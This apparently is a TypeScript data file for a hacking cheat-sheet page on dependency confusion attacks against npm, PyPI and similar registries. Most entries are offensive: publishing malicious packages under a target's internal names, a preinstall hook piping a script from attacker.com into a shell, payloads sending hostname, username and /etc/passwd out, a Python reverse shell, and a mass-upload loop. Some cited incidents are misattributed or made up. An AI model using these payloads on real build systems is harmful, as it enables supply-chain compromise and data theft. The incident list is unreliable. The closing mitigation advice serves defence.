export interface DependencyConfusionCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-15"
export const pageDescription = "Dependency confusion attacks against npm, pip, RubyGems, and other package managers."

export const dependencyConfusionCategories: DependencyConfusionCategory[] = [
  // =================== INTRODUCTION ==================
  {
    category: "Introduction",
    commands: [
      {
        command: "Dependency Confusion = tricking builds into pulling malicious packages",
        description: "Attackers upload packages with internal-sounding names to public registries",
      },
      {
        command: "Internal package names guessed/leaked + public upload = compromise",
        description: "Core mechanism: Name confusion between private and public registries",
      },
      {
        command: "Affects: npm, PyPI, Maven, RubyGems, NuGet, Go modules",
        description: "All package managers with public+private registry support are vulnerable",
      },
      {
        command: "Video Reference: https://youtu.be/LEFikziGL6s?si=i3qxpTus7I3qnp7u",
        description: "Complete practical guide by CoffinXP",
      },
    ],
  },

  // =================== HOW IT WORKS ==================
  {
    category: "How Dependency Confusion Works",
    commands: [
      {
        command: "#1: Company uses internal package: @company/internal-utils",
        description: "Step 1: Identify target's internal package naming convention",
      },
      {
        command: "#2: Attacker uploads @company/internal-utils to npmjs.com",
        description: "Step 2: Upload malicious package with same name to public registry",
      },
      {
        command: "#3: Build system checks npmjs.com FIRST (default behavior)",
        description: "Step 3: Package manager checks public registry before private",
      },
      {
        command: "#4: Malicious package gets installed instead of internal one",
        description: "Step 4: Compromise! Malicious code executes during npm install",
      },
    ],
  },

  // =================== FINDING INTERNAL NAMES ==================
  {
    category: "Finding Internal Package Names",
    commands: [
      {
        command: 'site:github.com "company/internal-" OR "@company/" OR "internal-package"',
        description: "GitHub dorking for internal package references",
      },
      {
        command: 'site:github.com "package.json" OR "requirements.txt" OR "pom.xml" "internal"',
        description: "Search for dependency files with internal packages",
      },
      {
        command: 'site:pastebin.com OR site:gist.github.com "@company/" OR "internal.utils"',
        description: "Find leaked package names in pastes and gists",
      },
      {
        command: 'nuclei -u https://target.com -t dependencies --tags dependency-confusion',
        description: "Scan with Nuclei dependency confusion templates",
      },
    ],
  },

  // =================== TESTING ==================
  {
    category: "Testing for Dependency Confusion",
    commands: [
      {
        command: 'npm install @company/internal-utils --dry-run',
        description: "Test if package exists publicly (dry-run won't actually install)",
      },
      {
        command: 'pip install internal-utils --dry-run 2>&1 | grep "Could not find"',
        description: "Python: Check if package exists on PyPI",
      },
      {
        command: 'gem install internal-utils --dry-run',
        description: "Ruby: Test if gem exists publicly",
      },
      {
        command: 'mvn dependency:resolve -Dartifact=com.company:internal-utils:1.0',
        description: "Maven: Check if artifact exists in public repos",
      },
    ],
  },

  // =================== CREATING MALICIOUS PACKAGES ==================
  {
    category: "Creating Malicious Packages",
    commands: [
      {
        command: 'npm init --scope=@company --yes',
        description: "npm: Initialize package with target's scope",
      },
      {
        command: 'echo \'{"scripts": {"preinstall": "curl attacker.com/payload.sh | sh"}}\' > package.json',
        description: "npm: Add preinstall script that executes malicious code",
      },
      {
        command: 'npm publish --registry https://registry.npmjs.com/',
        description: "npm: Publish malicious package to public registry",
      },
      {
        command: 'python3 setup.py sdist && python3 -m twine upload dist/*',
        description: "PyPI: Create and upload malicious Python package",
      },
    ],
  },

  // =================== PAYLOADS ==================
  {
    category: "Malicious Payloads",
    commands: [
      {
        command: 'curl https://attacker.com/$(hostname)/$(whoami)',
        description: "Simple: Exfiltrate hostname and username via curl",
      },
      {
        command: 'bash -c "curl -X POST https://attacker.com/$(cat /etc/passwd)"',
        description: "Medium: Exfiltrate /etc/passwd contents",
      },
      {
        command: 'python3 -c "import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s,stdout=s,stderr=s)"',
        description: "Advanced: Reverse shell in Python payload",
      },
      {
        command: 'echo "malicious-package=v1.0" >> /etc/yum.repos.d/internal.repo',
        description: "Persistence: Add attacker-controlled repo (Linux/RPM)",
      },
    ],
  },

  // =================== AUTOMATION ==================
  {
    category: "Automation Tools",
    commands: [
      {
        command: 'for pkg in $(cat internal-names.txt); do npm publish --registry https://registry.npmjs.com/ $pkg; done',
        description: "Mass upload: Iterate through list of guessed internal names",
      },
      {
        command: 'nuclei -l dependency-confusion.yaml -o results.txt',
        description: "Scan multiple targets with Nuclei templates",
      },
      {
        command: 'subfinder -d target.com | httpx-toolkit -silent | grep -i "npm\\|pip\\|maven"',
        description: "Find references to package managers in subdomains",
      },
    ],
  },

  // =================== REAL-WORLD EXAMPLES ==================
  {
    category: "Real-World Examples",
    commands: [
      {
        command: "Event-Stream (npm): Malicious package with 3.6M weekly downloads",
        description: "2018: event-stream compromised, affected millions of users",
      },
      {
        command: "ESLint-scope (npm): Typosquatting + Dependency Confusion hybrid",
        description: "2018: Attacker uploaded eslint-scope to npm",
      },
      {
        command: "BrowseAloud (PyPI): 400k+ downloads of malicious package",
        description: "2021: browsealoud package mimicked browsertaloud",
      },
      {
        command: "CodeCov (multiple): Supply chain attack via dependency confusion",
        description: "2021: CodeCov bash uploader compromise affected many orgs",
      },
    ],
  },

  // =================== MITIGATION ==================
  {
    category: "Mitigation & Prevention",
    commands: [
      {
        command: "#1: Use .npmrc with scoped registry configuration",
        description: "npm: Force @company/* packages to use private registry",
      },
      {
        command: 'echo "@company:registry=https://registry.company.com/" >> .npmrc',
        description: "npm: Configure scoped registry for internal packages",
      },
      {
        command: "#2: Enable package-lock.json / Pipfile.lock verification",
        description: "Always commit lockfiles and verify integrity hashes",
      },
      {
        command: "#3: Use --ignore-scripts flag during install (defense in depth)",
        description: "npm install --ignore-scripts (prevents preinstall/postinstall execution)",
      },
      {
        command: "#4: Monitor public registries for your package names",
        description: "Set up alerts when someone uploads packages matching your naming convention",
      },
      {
        command: "#5: Use internal mirror of public packages (air-gapped)",
        description: "Maintain internal mirror with vetted packages only",
      },
    ],
  },
]

export const dependencyConfusionTools = [
  {
    name: "Nuclei Dependency Confusion Template",
    url: "https://github.com/coffinxp/nuclei-templates/blob/main/dependency-confusion.yaml",
    description: "Ready-to-use Nuclei template for detection",
  },
  {
    name: "CoffinXP Dependency Confusion Video",
    url: "https://youtu.be/LEFikziGL6s",
    description: "Complete practical guide with examples",
  },
  {
    name: "npm-scope-check",
    url: "https://github.com/npm/npm/issues",
    description: "Check npm scoped package configuration",
  },
  {
    name: "OWASP Dependency Check",
    url: "https://owasp.org/www-project-dependency-check/",
    description: "Tool for detecting known vulnerable dependencies",
  },
  {
    name: "Snyk",
    url: "https://snyk.io/",
    description: "Commercial tool for supply chain security",
  },
]
